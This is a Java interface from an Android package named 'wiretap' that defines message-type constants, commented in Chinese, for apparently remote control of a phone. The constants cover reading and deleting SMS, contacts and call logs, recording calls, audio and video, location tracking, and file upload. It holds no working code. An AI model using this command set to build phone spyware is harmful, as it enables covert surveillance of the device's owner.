package com.pgw.wiretap.control.domain;

import android.os.Environment;

public interface MsgType {

//	连接（1-100）
//	连接服务器
	int CONNECTION = 1;
//	连接关闭
	int CONNECTION_CLOSE = 2;
//	发送信息
	int SEND = 3;
//	发送信息成功
	int SEND_SUCCESS = 4;
//	列出在线人员列表
	int LIST_ONLINE = 5;
//	网络错误
	int NETWORK_ERROR = 6;
//	没有连接到服务器
	int NOT_CONNECT_SERVER = 7;
//	测试连接
	int  TEST_CONNECT = 8;
//	用户不存在
	int USER_NOT_EXIST = 9;
	
	int ON_ERROR = 10;
	
	int ON_CLOSE = 11;
	
	
//	登陆（101-200）
//	登陆
	int LOGIN = 101;
//	登陆成功
	int LOGIN_SUCCESS = 102;
	
//	聯繫人（201-300）
//	联系人列表
	int CONTACTS_LIST = 201;
//	读取联系人列表
	int READ_CONTACTS = 202;
	
	
//	短信（301-400）

//	按照ID删除一条短信
	int DEL_SMS_ID = 302;
//	删除短信成功
	int DEL_SMS_SUCCESS = 303;
//	按照联系人删除短信
	int DEl_SMS_CONVERS = 301;
//	列出短信的联系人列表
	int SMS_CONVERS_LIST = 304;
//	读取短信列表
	int READ_SMS_LIST = 305;
//	读取短信的会话列表
	int READ_SMS_CONVERS_LIST = 306;
	int SMS = 307;
//	短信列表
	int SMS_LIST = 308;
//	插入短信
	int INSERT_SMS = 309;
//	给其他人发短信
	int SEND_SMS_TO_OTHER_PHONE = 310;
//	收到一条短信
	int SMS_RECEIVER = 801;
	
	
	
	
//	通话（401-500）
	//拨打其他人电话
	int CALL_OTHER_PHONE = 401;
//	拨出电话
	int NEW_OUTGOING_CALL = 402;
//	挂断电话
	int CALL_STATE_IDLE = 403;
//	电话响铃中
	int CALL_STATE_RINGING = 404;
//	接通电话
	int CALL_STATE_OFFHOOK = 405;
//	挂断正在通话的电话
	int END_CALL = 406;
	String CALL_FILE_PATH="/sdcard/Android/Calls/";
	
	
//	文件（501-600）
//	删除文件
	int FILE_DEL = 501;
//	删除文件成功
	int FILE_DEL_SUCCESS = 502;
	
//	下载文件成功
	int FILE_DOWNLOAD_SUCCESS = 503;
//	文件不存存在
	int FILE_NOT_EXIST = 504;
//	上传文件
	int FILE_UPLOAD = 505;
//	列出文件列表
	int FILE_LIST=506;
	//删除文件失败
	int FILE_DEL_FAIL = 507;
	
//	通话记录（601-700）
//	通话记录列表
	int CALLS_LOG_LIST = 601;
//	读取通话记录
	int READ_CALLS_LOG = 602;
	
//照相（701-800）
	int CAMERA = 701;
	
	
	
//	录音（801-900）
//开始录音
	int START_VOICE_RECODER = 802;
//	开始录音成功
	int START_VOICE_RECODER_SUCCESS = 803;
//	停止录音
	int STOP_VOICE_RECODER = 804;
//	停止录音成功
	int STOP_VOICE_RECODER_SUCCESS = 805;
//	开始录音失败
	int START_VOICE_RECODER_FAILE = 806;
//	停止录音失败
	int STOP_VOICE_RECODER_FAILE = 807;
	
	String VOICE_FILE_PATH= "/sdcard/Android/Voice/";
	
	
//	录像（901-1000）
//	开始录像
	int START_VIDEO_RECODER = 901;
//	开始录像成功
	int START_VIDEO_RECODER_SUCCESS = 902;
//	开始录像失败
	int START_VIDEO_RECODER_FAIL = 903;
//	停止录像
	int STOP_VIDEO_RECODER = 904;
//	停止录像成功
	int STOP_VIDEO_RECODER_SUCCESS = 905;
//	停止录像失败
	int STOP_VIDEO_RECODER_FAIL = 906;
	
	
//	定位（1001-1100）
	int LOCATION = 1001;
//	开始定位
	int START_LOCATION = 1002;
//	开始定位成功
	int START_LOCATION_SUCCESS = 1003;
//	开始定位失败
	int START_LOCATION_FAIL = 1004;
//	停止定位
	int STOP_LOCATION = 1005;
//	停止定位成功
	int STOP_LOCATION_SUCCESS = 1006;
//	停止定位失败
	int STOP_LOCATION_FAILE = 1007;
	
	
	
//	常用设置（1101-1200）
//	打开WIFI
	int OPEN_WIFI = 1101;
//	打开WIFI成功
	int OPEN_WIFI_SUCCESS = 1102;
//	打开WIFI失败
	int OPEN_WIFI_FAIL = 1103;
//	关闭WIFI
	int CLOSE_WIFI = 1104;
//	关闭WIFI成功
	int CLOSE_WIFI_SUCCESS = 1105;
//	关闭WIFI失败
	int CLOSE_WIFI_FAIL = 1106;
	
//	开启屏幕
	int SCREEN_ON = 1107;
//	关闭屏幕
	int SCREEN_OFF = 1108;
//	屏幕解成功开始使用
	int USER_PRESENT=1109;
	
//	打开通知信息
	int OPEN_NOTIFICATION = 1110;
//	关闭通知信息
	int CLOSE_NOTIFICATION = 1111;
//	关闭通知成功
	int CLOSE_NOTIFICATION_SUCCESS = 1112;
//	打开通知成功
	int OPEN_NOTIFICATION_SUCCESS = 1113;
	
	



}
